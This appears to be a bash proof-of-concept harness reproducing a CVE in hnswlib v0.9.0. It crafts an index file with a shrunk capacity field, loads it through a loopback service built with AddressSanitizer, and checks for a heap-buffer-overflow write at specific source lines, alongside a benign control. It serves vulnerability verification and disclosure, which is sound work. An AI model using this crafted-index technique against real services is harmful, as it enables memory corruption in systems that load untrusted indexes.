#!/usr/bin/env bash
# Loopback consumer experiment for CVE-2026-124959. Compiles the pinned
# verbatim v0.9.0 header, serves a crafted index from 127.0.0.1 and loads it
# inside the service process. Fixed side is an UNMERGED PR #677 head, never a
# released version. No external probe, no other plant, no library edits.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
FRONTIER="$HERE/../frontier/hnswlib"
mkdir -p "$OUT"
cd "$FRONTIER/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

rm -rf "$OUT/v09"
mkdir -p "$OUT/v09"
tar -xzf "$FRONTIER/src/v0.9.0.tar.gz" -C "$OUT/v09" --strip-components=1 || exit 2

# The frontier plain driver's own serializer writes a valid index, then only
# the stored capacity field is shrunk to 2 and the level0 image filled with
# the chosen marker. Nothing here patches the library.
g++ -std=c++11 -O1 -g -I"$OUT/v09" "$FRONTIER/driver.cpp" -o "$OUT/gen" -pthread || exit 2
g++ -std=c++11 -O0 -g -fsanitize=address -fno-omit-frame-pointer \
  -I"$OUT/v09" "$HERE/service.cpp" -o "$OUT/service_asan" -pthread || exit 2
g++ -std=c++11 -O0 -g -I"$OUT/v09" "$HERE/service.cpp" \
  -o "$OUT/service_gdb" -pthread || exit 2

"$OUT/gen" save "$OUT/hostile-5a.bin" 5a || exit 2
"$OUT/gen" save "$OUT/hostile-a5.bin" a5 || exit 2
cp "$OUT/hostile-5a.bin" "$OUT/benign.bin"
python3 - "$OUT/benign.bin" <<'PY' || exit 2
import struct, sys
p = sys.argv[1]
with open(p, "r+b") as f:
    f.seek(8)
    f.write(struct.pack("<Q", 512))
PY
sha256sum "$OUT/hostile-5a.bin" "$OUT/hostile-a5.bin" "$OUT/benign.bin" \
  > "$OUT/index-sha256.txt"

port=49371
ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \
  "$OUT/service_asan" "$port" "$OUT/received.bin" > "$OUT/service-asan.log" 2>&1 &
spid=$!
python3 "$HERE/client.py" "$port" "$OUT/hostile-5a.bin" > "$OUT/client.log" 2>&1
wait "$spid"
src=$?
echo "service_asan_rc=$src"
cat "$OUT/client.log" "$OUT/service-asan.log"

python3 - "$OUT/received.bin" "$OUT/hostile-5a.bin" <<'PY' || exit 2
import hashlib, sys
a, b = (open(p, "rb").read() for p in sys.argv[1:3])
print("received_sha256=%s crafted_sha256=%s bytes_match=%s" % (
    hashlib.sha256(a).hexdigest(), hashlib.sha256(b).hexdigest(), a == b))
if a != b:
    raise SystemExit(2)
PY

ok=0
case "$(cat "$OUT/service-asan.log")" in
  *heap-buffer-overflow*WRITE*65472*hnswalg.h:779*hnswalg.h:776*) ok=1 ;;
esac
echo "service_asan_write_at_pinned_sink=$ok"
[ "$ok" -eq 1 ] || exit 1

# Benign capacity-fits control through the same socket service.
port2=49372
ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \
  "$OUT/service_asan" "$port2" "$OUT/received-benign.bin" > "$OUT/service-benign.log" 2>&1 &
bp=$!
python3 "$HERE/client.py" "$port2" "$OUT/benign.bin" >> "$OUT/client.log" 2>&1
wait "$bp"
echo "service_benign_rc=$?"
cat "$OUT/service-benign.log"
case "$(cat "$OUT/service-benign.log")" in
  *service_load=loaded*) echo "benign_control=clean" ;;
  *) echo "benign_control=FAILED"; exit 1 ;;
esac
echo "ALL SERVICE CHECKS PASS"
